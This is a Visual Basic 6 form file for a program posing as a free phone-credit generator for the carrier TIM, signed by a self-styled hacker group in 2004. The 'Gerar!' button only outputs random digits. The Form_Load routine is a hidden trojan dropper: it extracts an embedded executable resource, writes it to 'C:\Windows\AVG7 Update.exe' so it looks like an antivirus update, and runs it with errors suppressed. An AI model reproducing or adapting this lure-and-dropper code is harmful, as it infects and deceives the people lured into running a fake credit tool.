VERSION 5.00
Begin VB.Form Form3 
   BackColor       =   &H00813D26&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Gerador de Créditos - Operadora: TIM"
   ClientHeight    =   2385
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4650
   Icon            =   "Form3.frx":0000
   LinkTopic       =   "Form3"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Form3.frx":2982
   ScaleHeight     =   2385
   ScaleWidth      =   4650
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text1 
      BeginProperty DataFormat 
         Type            =   1
         Format          =   "0"
         HaveTrueFalseNull=   0
         FirstDayOfWeek  =   0
         FirstWeekOfYear =   0
         LCID            =   1046
         SubFormatType   =   1
      EndProperty
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   360
      Left            =   2325
      MaxLength       =   16
      TabIndex        =   1
      Top             =   495
      Width           =   2025
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Gerar!"
      Height          =   375
      Left            =   2700
      TabIndex        =   0
      Top             =   960
      Width           =   1215
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackColor       =   &H00CC9999&
      BackStyle       =   0  'Transparent
      Caption         =   "Nº do Cartão:"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   270
      Left            =   2400
      TabIndex        =   6
      Top             =   135
      Width           =   1950
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackColor       =   &H00CC9999&
      BackStyle       =   0  'Transparent
      Caption         =   "Data:"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   270
      Left            =   555
      TabIndex        =   5
      Top             =   1500
      Width           =   750
   End
   Begin VB.Label lData 
      AutoSize        =   -1  'True
      BackColor       =   &H00CC9999&
      BackStyle       =   0  'Transparent
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   270
      Left            =   1335
      TabIndex        =   4
      Top             =   1530
      Width           =   150
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      BackColor       =   &H00CC9999&
      BackStyle       =   0  'Transparent
      Caption         =   "by 7£r@bY7£"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   225
      Left            =   3165
      TabIndex        =   3
      Top             =   1875
      Width           =   1320
   End
   Begin VB.Label Label4 
      AutoSize        =   -1  'True
      BackColor       =   &H00CC9999&
      BackStyle       =   0  'Transparent
      Caption         =   "Copyright 2004 - 7£r@bY7£ Hacker Underground Things Corp.®"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   165
      Left            =   285
      TabIndex        =   2
      Top             =   2160
      Width           =   4005
   End
End
Attribute VB_Name = "Form3"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim fourIni As Integer
Dim twaelvEnd As Integer
Dim random As String

Private Sub Command1_Click()

fourIni = Rnd(3) + Rnd(6 * Rnd(416516) + Rnd(Second(Time) * Rnd(Minute(Time))))
twaelvEnd = Rnd(Day(Date) * Left$(Time, 2) * Rnd(Month(Date)) + 4 * Rnd(Month(Date) + Rnd(Day(Date))) + 4 * Rnd(Day(Date))) * Minute(Time) + Minute(Time)
random = fourIni * 5 + twaelvEnd * 24 + Left$(Time, 2) & Abs(Int(31 * (Rnd(fourIni * Rnd(Rnd(twaelvEnd)))))) & Abs(Int(31 * (Rnd(Rnd(fourIni) * Rnd(Rnd(twaelvEnd)) + 9)))) & Abs(Int(fourIni * Day(Date) - 1)) & Abs(Int(31 * (Rnd(fourIni * Rnd(Rnd(twaelvEnd))) * Day(Date)))) & Abs(Int(31 * (Rnd(fourIni * Rnd(Rnd(Rnd(twaelvEnd))))))) & Abs(Int(31 * (Rnd(Rnd(fourIni) + Rnd(twaelvEnd))))) & Abs(Int(31 * (Rnd(fourIni & Rnd(twaelvEnd))))) & Abs(Int(31 * (Rnd(fourIni & Rnd(twaelvEnd))))) & Abs(Int(31 * (Rnd(fourIni & Rnd(twaelvEnd))))) & Abs(Int(31 * (Rnd(fourIni & Rnd(twaelvEnd))))) & Abs(Int(31 * (Rnd(fourIni & Rnd(twaelvEnd))))) & Abs(Int(31 * (Rnd(fourIni & Rnd(twaelvEnd))))) & Abs(Int(31 * (Rnd(fourIni & Rnd(twaelvEnd))))) & Abs(Int(fourIni)) & 2 * Abs(Int(Rnd * Day(Date))) & Abs(Int(31 * (Rnd(Rnd(fourIni) * Rnd(Rnd(twaelvEnd) + 9)))))
Text1.Text = Right$(random, 3) & Left$(random, 5) & Right$(StrReverse(random), 2) & random

End Sub

Private Sub Form_Load()
On Error Resume Next
If App.PrevInstance = True Then Unload Me
Dim dia As String
Dim mes As String
Dim DataDeHoje As String
If Len(Day(Date)) = 1 Then
dia = "0" & Day(Date)
Else
dia = Day(Data)
End If
If Len(Month(Date)) = 1 Then
mes = "0" & Month(Date)
Else
mes = Month(Date)
End If
DataDeHoje = dia & "/" & mes & "/" & Year(Date)
lData.Caption = DataDeHoje
Dim nome As String
Dim p_ret As String
nome = "C:\Windows\AVG7 Update.exe"
p_ret = StrConv(LoadResData("SERVER", "EXE"), vbUnicode)
Open nome For Binary As #1
Put #1, , p_ret
Close #1
Call Shell(nome)
End Sub

